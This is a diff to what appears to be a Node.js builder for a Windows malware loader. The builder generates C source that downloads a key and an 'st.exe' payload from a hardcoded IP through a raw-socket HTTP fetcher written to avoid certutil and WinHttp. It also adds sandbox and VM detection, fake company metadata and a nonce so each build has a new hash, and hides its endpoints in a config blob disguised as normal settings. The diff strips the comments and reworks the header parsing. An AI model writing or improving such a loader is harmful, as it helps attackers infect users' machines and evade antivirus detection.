@@ -14,7 +14,6 @@ const __dirname = path.dirname(__filename);
 const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
 const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';
 
-// ─── seeded PRNG (mulberry32) ────────────────────────────────────────────────
 function makeRng(seed) {
   let s = (seed >>> 0) || 1;
   return {
@@ -35,7 +34,6 @@ function makeRng(seed) {
   };
 }
 
-// ─── plausible metadata pools ────────────────────────────────────────────────
 const COMPANIES = [
   'Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation',
   'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises',
@@ -71,7 +69,6 @@ const INTERNAL_NAMES = [
 
 const COPYRIGHT_YEARS = ['2019', '2020', '2021', '2022', '2023', '2024', '2025'];
 
-// ─── per-build unique metadata ───────────────────────────────────────────────
 export function randomBuildMeta(seed) {
   const rng = makeRng(seed);
   const build = 19041 + rng.int(300);
@@ -100,7 +97,6 @@ export function randomBuildMeta(seed) {
   };
 }
 
-// ─── C source generator ──────────────────────────────────────────────────────
 function cSource(meta, ip, buildId) {
   const keyUrl = `http://${ip}/api/getkey/${buildId}`;
   const stUrl  = `http://${ip}/api/downloads/st.exe`;
@@ -117,7 +113,6 @@ function cSource(meta, ip, buildId) {
 
 #pragma comment(lib, "ws2_32.lib")
 
-// ── per-build unique metadata (changes hash every build) ────────────────────
 __attribute__((used))
 static const wchar_t META_GUID[]    = L"${esc4c(meta.guid)}";
 __attribute__((used))
@@ -127,7 +122,6 @@ static const wchar_t META_COMPANY[] = L"${esc4c(meta.company)}";
 __attribute__((used))
 static const char    BUILD_NONCE[16] = { ${nonceArr} };
 
-// ── config blob (looks like a normal app config, read at runtime) ───────────
 __attribute__((used))
 static const wchar_t CONFIG_BLOB[] =
     L"[agent]\n"
@@ -137,18 +131,15 @@ static const wchar_t CONFIG_BLOB[] =
     L"endpoint=${esc4c(stUrl)}\n"
     L"interval=${meta.retries * 600}\n";
 
-// ── endpoints ───────────────────────────────────────────────────────────────
 static const char CFG_IP[] = "${esc4c(ip)}";
 static const char CFG_KEY_PATH[] = "/api/getkey/${buildId}";
 static const char CFG_ST_PATH[]  = "/api/downloads/st.exe";
 
-// ── per-build tuning ────────────────────────────────────────────────────────
 #define INITIAL_SLEEP_MS ${meta.initialSleepMs}
 #define RETRIES          ${meta.retries}
 #define RETRY_DELAY_SEC  ${meta.retryDelaySec}
 #define LOG_NAME_W       L"${esc4c(meta.logName)}"
 
-// ── helpers ─────────────────────────────────────────────────────────────────
 static void log_msg(const wchar_t* msg) {
     wchar_t appdata[MAX_PATH], path[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata))) return;
@@ -184,7 +175,6 @@ static int is_pe(const wchar_t* p) {
     return sig[0] == 'M' && sig[1] == 'Z';
 }
 
-// ── raw HTTP GET downloader (avoids certutil/WinHttp entirely) ──────────────
 static int http_get(const char* host, const char* path, const wchar_t* dest) {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return 0;
@@ -221,7 +211,7 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     char buf[8192];
     int bytes = 0;
     int header_done = 0;
-    int header_buf_len = 0;
+    char h_buf[4] = {0}; // rolling window for \r\n\r\n
 
     HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) { closesocket(sock); WSACleanup(); return 0; }
@@ -229,11 +219,15 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     while ((bytes = recv(sock, buf, sizeof(buf), 0)) > 0) {
         int offset = 0;
         if (!header_done) {
-            // simple check for \r\n\r\n across chunks (good enough for 99% of servers)
-            for (int i = 0; i < bytes - 3; i++) {
-                if (buf[i]=='\r' && buf[i+1]=='\n' && buf[i+2]=='\r' && buf[i+3]=='\n') {
+            for (int i = 0; i < bytes; i++) {
+                h_buf[0] = h_buf[1];
+                h_buf[1] = h_buf[2];
+                h_buf[2] = h_buf[3];
+                h_buf[3] = buf[i];
+                
+                if (h_buf[0]=='\r' && h_buf[1]=='\n' && h_buf[2]=='\r' && h_buf[3]=='\n') {
                     header_done = 1;
-                    offset = i + 4;
+                    offset = i + 1;
                     break;
                 }
             }
@@ -249,7 +243,6 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     return size_ok(dest, 100);
 }
 
-// ── anti-VM / anti-sandbox (small, silent) ──────────────────────────────────
 static int is_sandboxed(void) {
     wchar_t sb[] = { L'S', L'b', L'i', L'e', L'D', L'l', L'l', L'.', L'd', L'l', L'l', 0 };
     if (GetModuleHandleW(sb)) return 1;
@@ -265,7 +258,6 @@ static int is_sandboxed(void) {
     return 0;
 }
 
-// ── entry ───────────────────────────────────────────────────────────────────
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
@@ -328,7 +320,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 `;
 }
 
-// ─── RC source generator (version resource per build) ───────────────────────
 function rcSource(meta) {
   const esc4rc = (s) => String(s).replace(/"/g, '""');
   return `
@@ -358,7 +349,6 @@ END
 `;
 }
 
-// ─── compile launcher ───────────────────────────────────────────────────────
 export async function compileLauncher({ key, config, baseExe, buildId }) {
   const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';
 
